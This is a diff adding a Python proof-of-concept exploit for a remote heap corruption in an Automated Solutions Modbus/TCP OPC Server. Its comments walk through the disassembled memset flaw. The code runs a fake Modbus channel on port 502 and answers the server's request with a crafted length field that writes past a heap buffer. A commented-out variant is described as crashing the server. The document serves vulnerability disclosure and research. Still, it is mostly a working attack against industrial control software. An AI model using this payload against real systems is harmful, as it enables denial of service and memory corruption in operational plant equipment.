@@ -1,0 +1,67 @@
+#!/usr/bin/python
+# asmb-heap.py
+# Automated Solutions Modbus/TCP OPC Server Remote Heap Corruption PoC
+# Jeremy Brown [0xjbrown41-gmail-com]
+# Jan 2011
+# 
+# A specially crafted length field in a MODBUS packet header can trigger heap corruption.
+#
+# 00408312  |> 8B5424 3C      MOV EDX,DWORD PTR SS:[ESP+3C] -> move length into edx
+# 00408316  |. 53             PUSH EBX                      -> push src onto stack
+# 00408317  |. 8B5C24 3C      MOV EBX,DWORD PTR SS:[ESP+3C] -> move dest into ebx 
+# 0040831B  |. 8BCA           MOV ECX,EDX                   -> move length into ecx
+# 0040831D  |. 55             PUSH EBP                      -> push ebp onto stack
+# 0040831E  |. 8BE9           MOV EBP,ECX                   -> move ecx into ebp
+# 00408320  |. 57             PUSH EDI                      -> push edi onto stack
+# 00408321  |. 33C0           XOR EAX,EAX                   -> eax = 0
+# 00408323  |. 8BFB           MOV EDI,EBX                   -> move dest into edi
+# 00408325  |. 895C24 1C      MOV DWORD PTR SS:[ESP+1C],EBX -> move ebx into dword at esp+1c
+# 00408329  |. C1E9 02        SHR ECX,2                     -> shift ecx right twice
+# 0040832C  |. F3:AB          REP STOS DWORD PTR ES:[EDI]   -> fill ecx dwords at edi with eax
+#
+# So basically memset(edi,eax,ecx). We control ecx, so we have control over the number of dwords
+# it writes in the heap buffer. But, as you can see, the dwords themselves are not controllable,
+# they are NULL. However, we can still write past the bounds of the allocated chunk of memory.
+#
+# Although it seems unlikely code execution could result, it is still possible to write data
+# past the memory allocated on a heap (0x350000) available in the server process.
+#
+# This code works by setting up a fake channel and accepting a connection. To trigger this
+# vulnerability, the server simply needs to initiate communication (monitor mode would be ideal)
+# with this fake channel and the results depend on the response you choose.
+#
+# I tested version 3 running on Windows. Testing the server with this code and its default
+# response should't cause the server to crash (immediately anyways). Larger lengths (such as
+# the one commented out) may cause the server to crash.
+#
+# Patch: http://automatedsolutions.com/demos/demoform.asp?code=17
+#
+
+import sys
+import socket
+
+port=502
+
+#       [trans]    [prot]     [len]      [u]   [f]    [bc]    [data]
+resp="\x00\x00"+"\x00\x00"+"\x02\x01"+"\x00"+"\x03"+"\x02"+"\x00\x00" # break @ 40832c, dump edi, keep hitting f9 and watch (debug)
+#resp="\x00\x00"+"\x00\x00"+"\x02\xb0"+"\x00"+"\x03"+"\x02"+"\x00\x00" # Heap block at 0035F2D0 modified at 0035F4E7 past requested size of 20f
+
+try:
+     sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+     sock.bind(("",port))
+     sock.listen(1)
+     conn,addr=sock.accept()
+
+except IOError,e:
+     print e
+
+print "OPC server at %s connected\n"%addr[0]
+
+req=conn.recv(32)
+print "<-- %s"%req.encode("hex")
+
+conn.send(resp)
+print "--> %s\n"%resp.encode("hex")
+conn.close()
+
+print "finished, check server"
